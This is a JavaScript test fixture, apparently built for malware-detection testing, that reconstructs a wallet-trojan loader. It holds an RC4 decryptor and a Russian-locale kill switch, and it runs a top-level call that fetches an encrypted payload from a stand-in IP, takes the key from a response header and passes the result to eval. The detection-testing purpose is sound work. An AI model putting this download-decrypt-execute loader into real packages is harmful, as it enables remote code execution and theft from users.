// SANITIZED TEST FIXTURE — reconstructed from public IOCs for detection testing
// Wave 4: Encrypted JS + Hardware Wallet Trojanization (Dec 2025)
// Source: Koi Security analysis, BleepingComputer
// Pattern: RC4 obfuscation + HTTP header key delivery + eval + Russian locale check

const http = require('http');

// RC4 decryption implementation
function rc4Decrypt(key, data) {
    const S = new Array(256);
    const K = new Array(256);
    
    // Key-scheduling algorithm (KSA)
    for (let i = 0; i < 256; i++) {
        S[i] = i;
        K[i] = key.charCodeAt(i % key.length);
    }
    
    let j = 0;
    for (let i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256;
        const tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }
    
    // Pseudo-random generation algorithm (PRGA)
    let i = 0;
    j = 0;
    let result = '';
    
    for (let k = 0; k < data.length; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        const tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        
        const t = (S[i] + S[j]) % 256;
        result += String.fromCharCode(data.charCodeAt(k) ^ S[t]);
    }
    
    return result;
}

// Russian locale gating - skip execution if Russian locale detected
function isRussianLocale() {
    try {
        const locale = Intl.DateTimeFormat().resolvedOptions().locale;
        if (/ru/i.test(locale)) {
            return true;
        }
    } catch (e) {
        // Ignore errors
    }
    return false;
}

// Fetch encrypted payload with key in response header
function fetchPayload() {
    if (isRussianLocale()) {
        return; // Skip execution for Russian users
    }
    
    http.get('http://192.0.2.1/payload', (res) => {
        const headers = res.headers;
        
        // Key delivered via HTTP response header (not hardcoded)
        const rc4Key = headers['x-session-key'];
        
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            // Decrypt and execute
            const decrypted = rc4Decrypt(rc4Key, data);
            eval(decrypted);
            // Alternative: new Function(decrypted)()
        });
    });
}

fetchPayload();
